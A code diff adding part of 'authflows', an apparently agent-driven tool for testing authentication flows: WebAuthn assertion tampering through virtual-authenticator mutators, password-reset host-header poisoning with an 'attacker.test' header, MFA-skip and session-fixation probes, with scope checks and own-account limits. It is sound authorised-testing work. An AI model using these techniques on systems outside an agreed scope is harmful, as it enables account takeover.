+WEBAUTHN_CHECKS = [
+    ("register-baseline",
+     "Enrol a passkey with a clean virtual authenticator, so the later checks "
+     "have a credential and a known-good baseline.",
+     "the registration ceremony completes and the account lists a passkey"),
+    ("origin-acceptance",
+     "Replay an assertion whose clientDataJSON carries a different origin "
+     "(run the ceremony on a host you control that is in scope, or edit origin "
+     "in the captured clientDataJSON and re-sign with the virtual "
+     "authenticator's key).",
+     "accepted = §7.2 origin step and §13.4.9 MUST NOT are violated: finding"),
+    ("rpid-breadth",
+     "Register on the apex, then run get() from an in-scope subdomain, and "
+     "fetch /.well-known/webauthn to see which related origins the RP declares.",
+     "accepted and not declared = over-broad scope; §13.4.9 permits a subdomain "
+     "rule, so report it as the blast radius of an XSS on any subdomain, not as "
+     "a spec violation"),
+    ("challenge-reuse",
+     "Capture one challenge from /assertion/options, complete the ceremony, "
+     "then submit a second assertion built on the SAME challenge.",
+     "accepted = the challenge is not single-use: replay. §13.4.3 finding"),
+    ("challenge-entropy",
+     "Pull 10 challenges from the options endpoint and measure length and "
+     "distinctness.",
+     "under 16 bytes decoded, or a repeat inside 10, fails §13.4.3"),
+    ("signcount-rollback",
+     "WebAuthn.setCredentialProperties with a signCount lower than the last "
+     "one the RP saw, then authenticate.",
+     "accepted = no clone detection. §7.2 leaves this to the RP, so this is an "
+     "observation/low, NOT a bypass"),
+    ("uv-downgrade",
+     "WebAuthn.setUserVerified false (and setResponseOverrideBits isBadUV) "
+     "against a flow that asked for userVerification=required.",
+     "accepted = the RP ignores the UV bit it demanded: finding"),
+    ("up-missing",
+     "setResponseOverrideBits isBadUP, i.e. an assertion with the UP flag "
+     "clear.",
+     "accepted = the §7.2 UP step is missing: finding"),
+    ("fallback-downgrade",
+     "With a passkey enrolled, ask for the login page as a browser that claims "
+     "no WebAuthn support (strip the API in an init script) and see which "
+     "factors are offered.",
+     "a password or SMS path still reaching a full session means the passkey is "
+     "an addition, not a factor: phishable, report as the real auth strength"),
+    ("recovery-adds-passkey",
+     "Run the account-recovery flow on YOUR OWN account and watch whether it "
+     "enrols a new passkey or elevates the session without re-authentication.",
+     "a recovery flow that silently adds a credential is the documented ATO "
+     "path: finding"),
+]
+
+
+def webauthn_plan(url, rpid, timeout_ms=10000):
+    """CDP calls and page script for the agent's browser tool to run.
+
+    This script does not drive a browser. It prints the exact calls and says
+    what each answer means, because the browser tool is the agent's and the
+    judging is the part a deterministic tool does better than a paragraph.
+    """
+    origin = urllib.parse.urlsplit(url)
+    rp = rpid or origin.netloc.split(":")[0]
+    return {
+        "target": url, "rp_id": rp,
+        "setup": [
+            {"cdp": "WebAuthn.enable", "params": {"enableUI": False}},
+            {"cdp": "WebAuthn.addVirtualAuthenticator", "params": {"options": {
+                "protocol": "ctap2", "ctap2Version": "ctap2_1",
+                "transport": "internal", "hasResidentKey": True,
+                "hasUserVerification": True, "isUserVerified": True,
+                "automaticPresenceSimulation": True,
+                "defaultBackupEligibility": True, "defaultBackupState": True}},
+             "keep": "authenticatorId"},
+        ],
+        "inspect": [
+            {"cdp": "WebAuthn.getCredentials", "params": {"authenticatorId": "$authenticatorId"},
+             "why": "the credentialId, rpId, signCount and userHandle the RP now has"},
+        ],
+        "mutators": {
+            "signcount-rollback": {"cdp": "WebAuthn.setCredentialProperties",
+                                   "params": {"authenticatorId": "$authenticatorId",
+                                              "credentialId": "$credentialId",
+                                              "signCount": 0}},
+            "uv-downgrade": [
+                {"cdp": "WebAuthn.setUserVerified",
+                 "params": {"authenticatorId": "$authenticatorId", "isUserVerified": False}},
+                {"cdp": "WebAuthn.setResponseOverrideBits",
+                 "params": {"authenticatorId": "$authenticatorId", "isBadUV": True}}],
+            "up-missing": {"cdp": "WebAuthn.setResponseOverrideBits",
+                           "params": {"authenticatorId": "$authenticatorId", "isBadUP": True}},
+            "bogus-signature": {"cdp": "WebAuthn.setResponseOverrideBits",
+                                "params": {"authenticatorId": "$authenticatorId",
+                                           "isBogusSignature": True},
+                                "why": "a control: if THIS is accepted the RP verifies no "
+                                       "signature at all and every other result above is moot"},
+            "backup-state": {"cdp": "WebAuthn.setCredentialProperties",
+                             "params": {"authenticatorId": "$authenticatorId",
+                                        "credentialId": "$credentialId",
+                                        "backupEligibility": False, "backupState": True},
+                             "why": "§7.2: BS set with BE clear must be rejected"},
+        },
+        "teardown": [
+            {"cdp": "WebAuthn.clearCredentials", "params": {"authenticatorId": "$authenticatorId"}},
+            {"cdp": "WebAuthn.removeVirtualAuthenticator",
+             "params": {"authenticatorId": "$authenticatorId"}},
+            {"cdp": "WebAuthn.disable", "params": {}},
+        ],
+        # Run this in the page to capture what the RP is asked to verify, so the
+        # judge has the clientDataJSON rather than a screenshot of a success page.
+        "page_script": (
+            "window.__mythos_wa = [];\n"
+            "for (const op of ['create','get']) {\n"
+            "  const orig = navigator.credentials[op].bind(navigator.credentials);\n"
+            "  navigator.credentials[op] = async (opts) => {\n"
+            "    const pk = opts && opts.publicKey || {};\n"
+            "    const b64 = (b) => btoa(String.fromCharCode(...new Uint8Array(b)))\n"
+            "      .replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');\n"
+            "    const rec = {op, rpId: pk.rpId || (pk.rp && pk.rp.id) || null,\n"
+            "      userVerification: (pk.authenticatorSelection||pk).userVerification || null,\n"
+            "      challenge: pk.challenge ? b64(pk.challenge) : null,\n"
+            "      challengeBytes: pk.challenge ? pk.challenge.byteLength : null};\n"
+            "    const cred = await orig(opts);\n"
+            "    try { rec.clientDataJSON = new TextDecoder().decode(cred.response.clientDataJSON); }\n"
+            "    catch (e) { rec.error = String(e); }\n"
+            "    window.__mythos_wa.push(rec); return cred;\n"
+            "  };\n"
+            "}\n"
+            "// after the ceremonies: JSON.stringify(window.__mythos_wa)\n"),
+        "checks": [{"name": n, "do": d, "oracle": o} for n, d, o in WEBAUTHN_CHECKS],
+        "timeout_ms": timeout_ms,
+    }
+
+
+def judge_webauthn(obs):
+    """Grade observations the agent's browser produced.
+
+    `obs` is a dict with any of: challenges (list of base64url strings),
+    client_data (list of parsed clientDataJSON dicts), expected_origin,
+    expected_rp_id, related_origins (list), accepted (dict check -> bool).
+    """
+    findings = []
+
+    chals = obs.get("challenges") or []
+    if chals:
+        lens = []
+        for c in chals:
+            try:
+                lens.append(len(base64.urlsafe_b64decode(c + "=" * (-len(c) % 4))))
+            except Exception:
+                lens.append(len(c))
+        if min(lens) < 16:
+            findings.append({"check": "challenge-entropy", "severity": "finding",
+                             "spec": "WebAuthn L3 §13.4.3",
+                             "detail": f"shortest challenge decodes to {min(lens)} bytes; "
+                                       "the spec says SHOULD be at least 16"})
+        if len(set(chals)) < len(chals):
+            findings.append({"check": "challenge-entropy", "severity": "finding",
+                             "spec": "WebAuthn L3 §13.4.3",
+                             "detail": f"{len(chals) - len(set(chals))} repeat(s) in "
+                                       f"{len(chals)} challenges: not randomly generated "
+                                       "per ceremony"})
+        if len(chals) > 1 and len(set(chals)) == len(chals) and min(lens) >= 16:
+            findings.append({"check": "challenge-entropy", "severity": "ok",
+                             "spec": "WebAuthn L3 §13.4.3",
+                             "detail": f"{len(chals)} distinct challenges, "
+                                       f"{min(lens)}+ bytes each"})
+
+    for cd in obs.get("client_data") or []:
+        want_type = "webauthn.get" if cd.get("type", "").endswith("get") else "webauthn.create"
+        if cd.get("type") not in ("webauthn.get", "webauthn.create"):
+            findings.append({"check": "client-data", "severity": "note",
+                             "spec": "WebAuthn L3 §7.2",
+                             "detail": f"clientDataJSON type is {cd.get('type')!r}, "
+                                       f"not {want_type}"})
+        exp = obs.get("expected_origin")
+        if exp and cd.get("origin") and cd["origin"] != exp:
+            related = obs.get("related_origins") or []
+            sev = "note" if cd["origin"] in related else "finding"
+            findings.append({
+                "check": "origin-acceptance", "severity": sev,
+                "spec": "WebAuthn L3 §7.2 / §13.4.9",
+                "detail": f"an assertion with origin {cd['origin']!r} was accepted for "
+                          f"{exp!r}" + (" but that origin is declared at "
+                                        "/.well-known/webauthn, so §5.11 allows it"
+                                        if sev == "note" else
+                                        "; §13.4.9: the RP MUST NOT accept unexpected "
+                                        "values of origin")})
+        if cd.get("crossOrigin") is True and not obs.get("expects_iframe"):
+            findings.append({"check": "origin-acceptance", "severity": "finding",
+                             "spec": "WebAuthn L3 §7.2",
+                             "detail": "crossOrigin:true accepted although the RP does not "
+                                       "expect to be framed"})
+
+    accepted = obs.get("accepted") or {}
+    grades = {
+        "bogus-signature": ("critical", "WebAuthn L3 §7.2",
+                            "an assertion with a deliberately invalid signature was "
+                            "accepted: the RP verifies no signature. Every other result "
+                            "here is meaningless until this is fixed."),
+        "challenge-reuse": ("finding", "WebAuthn L3 §13.4.3",
+                            "a second assertion over the same challenge was accepted: "
+                            "assertions are replayable"),
+        "up-missing": ("finding", "WebAuthn L3 §7.2",
+                       "an assertion with the UP flag clear was accepted: the user-presence "
+                       "step is not checked"),
+        "uv-downgrade": ("finding", "WebAuthn L3 §7.2",
+                         "UV clear accepted for a ceremony that asked for "
+                         "userVerification=required"),
+        "backup-state": ("finding", "WebAuthn L3 §7.2",
+                         "BS set with BE clear was accepted, which §7.2 forbids"),
+        "recovery-adds-passkey": ("finding", "operational",
+                                  "the recovery flow enrolled a credential without "
+                                  "re-authentication: the documented passkey ATO path"),
+        "fallback-downgrade": ("finding", "operational",
+                               "a weaker factor still reaches a full session with a passkey "
+                               "enrolled: the account's real strength is that factor"),
+        # Graded down on purpose: the spec leaves this to the RP.
+        "signcount-rollback": ("observation", "WebAuthn L3 §7.2",
+                               "a non-increasing signCount was accepted. The spec calls this "
+                               "'a signal, but not proof' of cloning and leaves the response "
+                               "RP-specific, and synced passkeys report 0 forever. Report as "
+                               "missing clone detection, not as a bypass."),
+        "rpid-breadth": ("observation", "WebAuthn L3 §13.4.9",
+                         "the credential works on a wider origin set than the apex. §13.4.9 "
+                         "permits a subdomain rule; the impact is that an XSS on any "
+                         "subdomain reaches the passkey."),
+    }
+    for name, ok in accepted.items():
+        if not ok:
+            findings.append({"check": name, "severity": "ok",
+                             "detail": "rejected, as the spec requires"})
+            continue
+        sev, spec, detail = grades.get(
+            name, ("note", "", "accepted; no grading rule for this check"))
+        findings.append({"check": name, "severity": sev, "spec": spec, "detail": detail})
+    return {"findings": findings,
+            "summary": {sev: sum(1 for f in findings if f["severity"] == sev)
+                        for sev in sorted({f["severity"] for f in findings})}}
+
+
+def cmd_webauthn(a):
+    if a.judge:
+        obs = json.loads(pathlib.Path(a.judge).read_text(encoding="utf-8"))
+        return {"subcommand": "webauthn", "mode": "judge", **judge_webauthn(obs)}
+    require_in_scope(a.url)
+    plan = webauthn_plan(a.url, a.rp_id)
+    return {"subcommand": "webauthn", "mode": "emit", "plan": plan,
+            "notes": ["Run these with the agent's browser tool, collect "
+                      "challenges, the captured clientDataJSON values and an "
+                      "accepted:{check: bool} map into a JSON file, then "
+                      "re-run with --judge FILE.",
+                      "Your own account only: the recovery and fallback checks "
+                      "change authentication state."]}
+
+# --------------------------------------------------------------- render
+
+
+def render(res):
+    out = [f"# authflows {res['subcommand']}"]
+
+    def block(title, body):
+        out.append("")
+        out.append(f"## {title}")
+        out.extend(body)
+
+    if res["subcommand"] == "reset":
+        if res["variants"]:
+            block("host poisoning variants", [
+                f"{v['status']} {v['label']:<22} reflected={v['oast_reflected']} "
+                f"{v['bytes']}B {v.get('location', '')[:60]}" for v in res["variants"]]
+                + ["", "Reflection is a hint about which header is trusted. The "
+                       "finding is the link host in the mail you received."])
+        if res["tokens"]:
+            block("reset tokens", token_lines(res["tokens"]))
+        if res["reuse"]:
+            block("token reuse", [f"first={res['reuse']['first']} "
+                                  f"second={res['reuse']['second']}",
+                                  res["reuse"]["verdict"]])
+        if res["referer"]:
+            r = res["referer"]
+            block("Referer leak", [f"Referrer-Policy: {r['referrer_policy'] or '(none)'}",
+                                   f"meta referrer: {r['meta_referrer'] or '(none)'}",
+                                   "third-party hosts: " + (", ".join(
+                                       r["third_party_asset_hosts"]) or "(none)"),
+                                   r["verdict"]])
+    elif res["subcommand"] == "mfa":
+        if res["skip"]:
+            block("second factor on other endpoints",
+                  [f"{s['path']}: partial={s['partial_status']} anon={s['anon_status']} "
+                   f"-> {s['verdict']}" for s in res["skip"]])
+        if res["stepup"]:
+            block("step-up required?",
+                  [f"{s['path']}: {s['status']} challenged={s['challenged']} "
+                   f"-> {s['verdict']}" for s in res["stepup"]])
+        if res["rate_limit"]:
+            block("rate limit (at most 6 wrong codes, never a search)",
+                  [f"{x['code']} -> {x['status']} {x['limit_headers'] or ''}"
+                   for x in res["rate_limit"]["attempts"]]
+                  + ["", res["rate_limit"]["verdict"]])
+        if res["device_token"]:
+            block("remember-device token", token_lines(res["device_token"]))
+    elif res["subcommand"] == "session":
+        block("cookies", [f"{name}: {', '.join(notes)}"
+                          for name, notes in res["flags"].items()] or ["(none set)"])
+        if res["fixation"]:
+            f = res["fixation"]
+            lines = [f"status {f['status']}", f["verdict"]]
+            if "replay_pre_login_id" in f:
+                lines += [f"replay of the pre-login id: "
+                          f"{f['replay_pre_login_id']['status']}",
+                          f['replay_pre_login_id']['verdict']]
+            block("fixation", lines)
+        if res["survival"]:
+            block("session after the change",
+                  [f"before={res['survival']['before']} after={res['survival']['after']}",
+                   res["survival"]["verdict"]])
+        if res["concurrent"]:
+            block("concurrent sessions", [res["concurrent"]["verdict"]])
+    elif res["subcommand"] == "emailchange":
+        block("change request", [f"status {res['change']['status']}"])
+        for key, title in (("password_required", "current password demanded?"),
+                           ("effect_before_verification", "pending address live?"),
+                           ("binding", "token bound to the account?")):
+            if res.get(key):
+                block(title, [res[key]["verdict"]])
+        if res["token"]:
+            block("verification token", token_lines(res["token"]))
+    elif res["subcommand"] == "webauthn":
+        if res["mode"] == "emit":
+            block("setup", [json.dumps(c) for c in res["plan"]["setup"]])
+            block("checks", [f"- {c['name']}\n  do: {c['do']}\n  oracle: {c['oracle']}"
+                             for c in res["plan"]["checks"]])
+            block("mutators", [f"{k}: {json.dumps(v)}"
+                               for k, v in res["plan"]["mutators"].items()])
+            block("page script (capture what the RP must verify)",
+                  [res["plan"]["page_script"]])
+            block("teardown", [json.dumps(c) for c in res["plan"]["teardown"]])
+        else:
+            block("judged", [f"[{f['severity']}] {f['check']}: {f.get('detail', '')}"
+                             + (f" ({f['spec']})" if f.get("spec") else "")
+                             for f in res["findings"]])
+            block("summary", [json.dumps(res["summary"])])
+
+    for n in res.get("notes") or []:
+        out += ["", n]
+    return "\n".join(out)
+
+
+def token_lines(t):
+    lines = [f"{len(t['tokens'])} sample(s)"]
+    for i in t["tokens"]:
+        lines.append(f"- {i['token']} len={i['length']} shape={i['shape']} "
+                     f"<= {i['alphabet_bits_upper_bound']} bits")
+        for e in i["embeds"]:
+            lines.append(f"    embeds {e}")
+        for k, v in (i["decodes"] or {}).items():
+            lines.append(f"    decodes as {k}: {str(v)[:120]}")
+    if t["shared_prefix"]:
+        lines.append(f"shared prefix: {t['shared_prefix']!r}")
+    lines.append("")
+    lines += [f"* {f}" for f in t["findings"]]
+    return lines
+
+# -------------------------------------------------------------- selftest
+
+
+def _selftest():
+    """Asserts on the offline logic: mutation set, token shapes, judging.
+
+    These are the parts that decide what gets sent and how an answer is read,
+    so a regression here silently changes what the engagement tested.
+    """
+    fails = []
+
+    def eq(got, want, label):
+        if got != want:
+            fails.append(f"{label}: got {got!r}, want {want!r}")
+
+    def ok(cond, label):
+        if not cond:
+            fails.append(label)
+
+    # --- header mutation generation
+    v = poison_variants("abc.oast.test")
+    names = [n for n, _ in v]
+    eq(len(set(names)), len(names), "variant labels are unique")
+    for must in ("host", "x-forwarded-host", "x-forwarded-server", "forwarded"):
+        ok(must in names, f"{must} variant present")
+    for label, hdrs in v:
+        ok(any("abc.oast.test" in str(x) for x in hdrs.values()),
+           f"variant {label} actually carries the destination host")
+        ok(all(h[:1].isupper() for h in hdrs), f"variant {label} header names are canonical")
+    eq(dict(v)["forwarded"], {"Forwarded": "host=abc.oast.test"}, "RFC 7239 Forwarded shape")
+    ok("Host" in dict(v)["host"], "the plain Host override exists")
+
+    # --- token analysis
+    t = analyse_tokens(["YWxpY2VAZXhhbXBsZS50ZXN0"], email="alice@example.test")
+    ok(any("email" in f for f in t["findings"]),
+       "a token that is just base64 of the address is called out")
+    seq = analyse_tokens([f"rst-{1000 + i}" for i in range(5)])
+    ok(any("counter" in f for f in seq["findings"]), "a sequential tail is detected")
+    ok(any("leading characters are identical" in f for f in seq["findings"]),
+       "a shared prefix is reported")
+    strong = analyse_tokens(["b3f1a4c99e2d47f8" * 4])
+    ok(not any("64 bits" in f for f in strong["findings"]),
+       "a 64-char hex token is not called too small")
+    eq(analyse_tokens(["0" * 16])["tokens"][0]["shape"], "decimal", "digits read as decimal")
+    eq(analyse_tokens(["b3f1a4c9"])["tokens"][0]["shape"], "hex", "hex read as hex")
+    eq(analyse_tokens(["1b4e28ba-2fa1-11d2-883f-0016d3cca427"])["tokens"][0]["shape"],
+       "uuid", "a uuid is recognised")
+    ok(alphabet_bits("0" * 8) < alphabet_bits("aA0" * 8),
+       "a wider alphabet gives a larger bound")
+    ok(any("shorter than 16" in e for e in
+           analyse_tokens(["abc123"])["tokens"][0]["embeds"]),
+       "a short token is flagged")
+    ts = analyse_tokens([f"tok{int(time.time())}xyz"])
+    ok(any("timestamp" in e for e in ts["tokens"][0]["embeds"]),
+       "an embedded current timestamp is found")
+
+    # --- reuse and Referer judging
+    ok("twice" in reuse_verdict(200, 200), "double acceptance is the finding")
+    ok("consumed" in reuse_verdict(200, 400), "single use reads as expected")
+    ok("inconclusive" in reuse_verdict(None, 200), "a failed request is not a verdict")
+    ok("no Referrer-Policy" in referer_verdict("", "", ["cdn.evil.test"]),
+       "no policy plus third-party assets is the leak")
+    ok("strips the path" in referer_verdict("no-referrer", "", ["cdn.evil.test"]),
+       "no-referrer closes it")
+    ok("no third-party" in referer_verdict("", "", []), "no assets, no path")
+    eq(meta_referrer('<meta name="referrer" content="no-referrer">'), "no-referrer",
+       "meta referrer parsed")
+    eq(external_hosts('<img src="https://cdn.test/a.png"><script src="/own.js">',
+                      "https://app.test/reset?token=1"), ["cdn.test"],
+       "only third-party hosts are listed")
+
+    # --- cookie judging
+    jar = parse_cookies(["sid=abc; Path=/; Domain=.example.test",
+                         "__Host-s=1; Path=/; Secure; HttpOnly; SameSite=Lax"])
+    eq(sorted(jar), ["__Host-s", "sid"], "both cookies parsed")
+    notes = judge_cookie("sid", jar["sid"], "app.example.test")
+    ok(any("HttpOnly" in n for n in notes), "missing HttpOnly reported")
+    ok(any("Secure" in n for n in notes), "missing Secure reported")
+    ok(any("parent domain" in n for n in notes),
+       "a parent-domain session cookie is the plant path")
+    eq(judge_cookie("__Host-s", jar["__Host-s"], "app.example.test"), ["flags look sane"],
+       "a correct __Host- cookie is clean")
+    bad_host = parse_cookies(["__Host-x=1; Path=/; Domain=example.test; Secure"])
+    ok(any("prefix's guarantee" in n for n in
+           judge_cookie("__Host-x", bad_host["__Host-x"], "example.test")),
+       "__Host- with Domain is broken")
+
+    # --- fixation
+    pre = parse_cookies(["sid=same; Path=/"])
+    ok("fixation" in fixation_verdict(pre, parse_cookies(["sid=same; Path=/"])),
+       "an unchanged id across login is fixation")
+    ok("rotated" in fixation_verdict(pre, parse_cookies(["sid=new; Path=/"])),
+       "a rotated id is expected")
+    ok("no cookie at all" in fixation_verdict(pre, {}), "no Set-Cookie at login is called out")
+    ok("nothing to fixate" in fixation_verdict({}, parse_cookies(["sid=x"])),
+       "no pre-login cookie, no fixation")
+
+    # --- MFA judging
+    ok("429" in limit_verdict([{"status": 200, "limit_headers": {}},
+                               {"status": 429, "limit_headers": {}}]),
+       "a 429 ends the probe with a verdict")
+    ok("no limit observed" in limit_verdict([{"status": 400, "limit_headers": {}}] * 6),
+       "six identical rejections is a candidate, not a proof")
+    ok("candidate only" in limit_verdict([{"status": 400, "limit_headers": {}}] * 6),
+       "and it says so")
+    ok("not enforced" in skip_verdict({"status": 200, "body": "CANARY42"},
+                                      {"status": 401, "body": ""}, "CANARY42"),
+       "a canary read with the partial session is the bypass")
+    ok("public" in skip_verdict({"status": 200, "body": ""},
+                                {"status": 200, "body": ""}, None),
+       "a path anonymous can read is not a bypass")
+    ok(looks_like_challenge({"status": 200, "body": "enter your current password",
+                             "headers": {}}), "a re-auth prompt is detected in the body")
+    ok(not looks_like_challenge({"status": 200, "body": "welcome", "headers": {}}),
+       "a plain page is not a challenge")
+
+    # --- WebAuthn plan and judging
+    plan = webauthn_plan("https://app.example.test/login", None)
+    eq(plan["rp_id"], "app.example.test", "RP ID defaults to the target host")
+    eq(plan["setup"][1]["cdp"], "WebAuthn.addVirtualAuthenticator", "the CDP call is the real one")
+    opts = plan["setup"][1]["params"]["options"]
+    eq(opts["protocol"], "ctap2", "protocol is a valid AuthenticatorProtocol enum value")
+    eq(opts["transport"], "internal", "transport is a valid AuthenticatorTransport value")
+    eq(opts["ctap2Version"], "ctap2_1", "ctap2Version is a valid Ctap2Version value")
+    ok(set(opts) <= {"protocol", "ctap2Version", "transport", "hasResidentKey",
+                     "hasUserVerification", "hasLargeBlob", "hasCredBlob",
+                     "hasMinPinLength", "hasPrf", "hasHmacSecret",
+                     "automaticPresenceSimulation", "isUserVerified",
+                     "defaultBackupEligibility", "defaultBackupState"},
+       "no invented VirtualAuthenticatorOptions fields")
+    eq(plan["mutators"]["up-missing"]["params"]["isBadUP"], True,
+       "UP is cleared through setResponseOverrideBits, which is the field that exists")
+    ok("signCount" in plan["mutators"]["signcount-rollback"]["params"],
+       "signCount is set via setCredentialProperties")
+    ok(len(plan["checks"]) >= 8, "every named check is in the emitted plan")
+
+    j = judge_webauthn({"accepted": {"signcount-rollback": True, "up-missing": True,
+                                     "bogus-signature": False}})
+    by = {f["check"]: f for f in j["findings"]}
+    eq(by["signcount-rollback"]["severity"], "observation",
+       "a signCount rollback is NOT graded as a bypass: W3C §7.2 leaves it to the RP")
+    eq(by["up-missing"]["severity"], "finding", "a missing UP flag is a finding")
+    eq(by["bogus-signature"]["severity"], "ok", "a rejected bogus signature is fine")
+    j2 = judge_webauthn({"challenges": ["YWJj", "YWJj"], "expected_origin": "https://a.test",
+                         "client_data": [{"type": "webauthn.get", "origin": "https://b.test"}]})
+    ok(any(f["check"] == "challenge-entropy" and f["severity"] == "finding"
+           for f in j2["findings"]), "a 3-byte repeated challenge fails §13.4.3")
+    ok(any(f["check"] == "origin-acceptance" and f["severity"] == "finding"
+           for f in j2["findings"]), "a foreign origin accepted is a finding")
+    j3 = judge_webauthn({"expected_origin": "https://a.test",
+                         "related_origins": ["https://b.test"],
+                         "client_data": [{"type": "webauthn.get", "origin": "https://b.test"}]})
+    eq([f["severity"] for f in j3["findings"] if f["check"] == "origin-acceptance"], ["note"],
+       "a declared related origin is allowed by §5.11, so it is only a note")
+    j4 = judge_webauthn({"challenges": [base64.urlsafe_b64encode(bytes(range(i, i + 16)))
+                                        .decode().rstrip("=") for i in range(5)]})
+    eq([f["severity"] for f in j4["findings"] if f["check"] == "challenge-entropy"], ["ok"],
+       "five distinct 16-byte challenges pass")
+
+    # One real request, against a server started here.
+    #
+    # Every assert above is offline, and offline asserts cannot see the bug this
+    # file actually shipped: the TLS context was passed to `OpenerDirector.open`,
+    # which takes no such keyword, so every request raised TypeError and the
+    # broad `except Exception` in `send()` turned it into `status: None` with
+    # the exception text as the body. The script looked like it was talking to a
+    # dead target while it had never sent a byte. A loopback round trip is the
+    # cheapest check that notices.
+    import http.server, socketserver, threading, tempfile
+
+    class _H(http.server.BaseHTTPRequestHandler):
+        def do_POST(self):
+            body = self.rfile.read(int(self.headers.get("content-length") or 0))
+            seen = self.headers.get("X-Forwarded-Host", "")
+            out = json.dumps({"ok": True, "xfh": seen, "len": len(body)}).encode()
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_header("Content-Length", str(len(out)))
+            self.end_headers()
+            self.wfile.write(out)
+
+        def do_GET(self):
+            self.send_response(204)
+            self.send_header("Content-Length", "0")
+            self.end_headers()
+
+        def log_message(self, *a):
+            pass
+
+    with socketserver.TCPServer(("127.0.0.1", 0), _H) as srv:
+        port = srv.server_address[1]
+        threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.1},
+                         daemon=True).start()
+        with tempfile.TemporaryDirectory() as td:
+            scope = pathlib.Path(td) / "scope.yaml"
+            scope.write_text(
+                f"target: http://127.0.0.1:{port}\nin_scope:\n  - 127.0.0.1\n"
+                f"ports: [{port}]\nrules:\n  rate_limit_rps: 50\n")
+            prev = os.environ.get("MYTHOS_SCOPE")
+            os.environ["MYTHOS_SCOPE"] = str(scope)
+            try:
+                r = send("POST", f"http://127.0.0.1:{port}/reset",
+                         dict(FORM_CT), form({"user": "alice"}))
+                eq(r["status"], 200, "a loopback POST comes back with a status, not None")
+                ok("TypeError" not in r["body"], "the response body is the server's, not an exception")
+                parsed = json.loads(r["body"])
+                eq(parsed["len"], len(form({"user": "alice"})), "the body reached the server intact")
+
+                hdr = send("POST", f"http://127.0.0.1:{port}/reset",
+                           {**FORM_CT, "X-Forwarded-Host": "attacker.test"},
+                           form({"user": "alice"}))
+                eq(json.loads(hdr["body"])["xfh"], "attacker.test",
+                   "a poisoning header actually reaches the target")
+            finally:
+                if prev is None:
+                    os.environ.pop("MYTHOS_SCOPE", None)
+                else:
+                    os.environ["MYTHOS_SCOPE"] = prev
+                srv.shutdown()
+
+    for f in fails:
+        print(f"FAIL {f}")
+    print(f"authflows selftest: {len(fails)} failure(s)")
+    return 1 if fails else 0
+
+# ------------------------------------------------------------------ cli
+
+
+def build_parser():
+    ap = argparse.ArgumentParser(
+        prog="authflows", description=__doc__,
+        formatter_class=argparse.RawDescriptionHelpFormatter)
+    ap.add_argument("--selftest", action="store_true", help="offline asserts, no network")
+    ap.add_argument("--json", action="store_true")
+    ap.add_argument("--timeout", type=float, default=10)
+    ap.add_argument("--insecure", action="store_true", help="skip TLS verification")
+    ap.add_argument("--rate", type=float, default=None,
+                    help="requests per second; default is rules.rate_limit_rps "
+                         "from $MYTHOS_SCOPE, else 5")
+    sub = ap.add_subparsers(dest="cmd")
+
+    r = sub.add_parser("reset", help="password-reset poisoning, token quality, reuse, Referer leak",
+                       description="Request a reset FOR YOUR OWN ADDRESS once per header "
+                                   "mutation, then judge the tokens you were mailed.")
+    r.add_argument("url", help="the reset-request endpoint (POST)")
+    r.add_argument("--email", required=True, help="YOUR address; mail goes nowhere else")
+    r.add_argument("--oast", help="host you control that the poisoned link should point at")
+    r.add_argument("--field", default="email", help="form field for the address")
+    r.add_argument("--token", action="append", default=[],
+                   help="a token you already received, repeatable; 5-10 gives the "
+                        "best read on structure")
+    r.add_argument("--confirm-url", help="the step that consumes the token, for the reuse check")
+    r.add_argument("--token-field", default="token")
+    r.add_argument("--password-field", default="password")
+    r.add_argument("--new-password", help="required for the reuse check: it really does "
+                                          "change your own account's password")
+    r.add_argument("--reset-link", help="a full reset URL, to measure the Referer leak")
+    r.set_defaults(fn=cmd_reset)
+
+    m = sub.add_parser("mfa", help="second factor not enforced, step-up gaps, device token, "
+                                   "rate limit (measured, never brute forced)")
+    m.add_argument("url", help="base URL of the application")
+    m.add_argument("--partial-cookie", help="the cookie jar after the password, before the OTP")
+    m.add_argument("--full-cookie", help="the cookie jar after a complete login")
+    m.add_argument("--protected", action="append", default=[],
+                   help="path that must demand the second factor, repeatable")
+    m.add_argument("--stepup", action="append", default=[],
+                   help="path that must re-authenticate even with a full session "
+                        "(disable-2fa, change-email, api-keys, backup-codes)")
+    m.add_argument("--canary", help="a string only your account's data contains")
+    m.add_argument("--verify-url", help="the OTP verification endpoint, for the limit probe")
+    m.add_argument("--code-field", default="code")
+    m.add_argument("--extra-field", action="append", default=[],
+                   help="name=value also required by the verify POST, repeatable")
+    m.add_argument("--limit-probe", type=int, default=5,
+                   help="wrong codes to send, hard-capped at 6")
+    m.add_argument("--device-token", action="append", default=[],
+                   help="a remember-this-device cookie value, repeatable")
+    m.add_argument("--email", help="your account's address, for the token analysis")
+    m.set_defaults(fn=cmd_mfa)
+
+    s = sub.add_parser("session", help="fixation, cookie flags and scope, rotation on "
+                                       "privilege change, survival, concurrency")
+    s.add_argument("url", help="a page that issues a session cookie (the login page)")
+    s.add_argument("--login-url")
+    s.add_argument("--username")
+    s.add_argument("--password")
+    s.add_argument("--user-field", default="username")
+    s.add_argument("--password-field", default="password")
+    s.add_argument("--me", help="path that reflects who you are, e.g. /api/me")
+    s.add_argument("--canary", help="a string only your account's data contains")
+    s.add_argument("--cookie", help="an authenticated jar, for the survival checks")
+    s.add_argument("--after-url", help="an endpoint on YOUR account that changes a "
+                                       "credential or privilege (password change, logout)")
+    s.add_argument("--after-body", help="body for --after-url")
+    s.add_argument("--second-cookie", help="a second authenticated jar for the same account")
+    s.set_defaults(fn=cmd_session)
+
+    e = sub.add_parser("emailchange", help="verification skipped, pending address usable, "
+                                           "old address still valid, token not bound")
+    e.add_argument("url", help="the change-of-address endpoint (POST)")
+    e.add_argument("--cookie", required=True, help="your own authenticated jar")
+    e.add_argument("--new-email", required=True, help="a second mailbox YOU own")
+    e.add_argument("--old-email", help="the address currently on the account, also yours")
+    e.add_argument("--field", default="email")
+    e.add_argument("--password", help="your current password, to test whether it is demanded")
+    e.add_argument("--password-field", default="current_password")
+    e.add_argument("--me", help="path that shows the account's address")
+    e.add_argument("--reset-url", help="reset endpoint, to see if the old address still works")
+    e.add_argument("--verify-url", help="verification URL with {token} where the token goes")
+    e.add_argument("--token", action="append", default=[])
+    e.add_argument("--other-cookie", help="userB's jar, for the binding check")
+    e.set_defaults(fn=cmd_emailchange)
+
